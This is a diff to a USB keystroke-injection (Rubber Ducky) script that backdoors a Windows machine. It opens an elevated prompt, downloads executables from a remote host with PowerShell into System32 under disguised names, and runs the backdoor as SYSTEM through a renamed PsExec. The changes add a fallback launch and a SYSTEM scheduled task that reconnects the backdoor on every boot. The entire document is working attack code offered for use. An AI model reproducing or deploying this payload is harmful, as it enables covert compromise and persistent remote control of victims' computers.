@@ -6,6 +6,7 @@ GUI r
 DELAY 3000
 REM Open command prompt with Admin rights
 STRING powershell Start-Process cmd -Verb runAs
+DELAY 200
 ENTER
 DELAY 8000
 ALT y
@@ -36,14 +37,22 @@ STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<IP_ADD
 STRING gnt.exe')
 DELAY 200
 ENTER
+DELAY 200
 REM Launch backdoor with obfuscated PsExec to have launched process run by Windows signed binary
 STRING %WINDIR%\System32\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe
 DELAY 200
 ENTER
+DELAY 200
+REM Run payload alone in case PsExec fails
+STRING %WINDIR%\System32\winmgnt.exe
+DELAY 200
+ENTER
+DELAY 200
 REM create scheduled task to connect backdoor on system start
 STRING schtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr "%WINDIR%\System32\winmgnt.exe"
 DELAY 200
 ENTER
+REM Replace schtask if it already exists
 STRING y
 DELAY 200
 ENTER
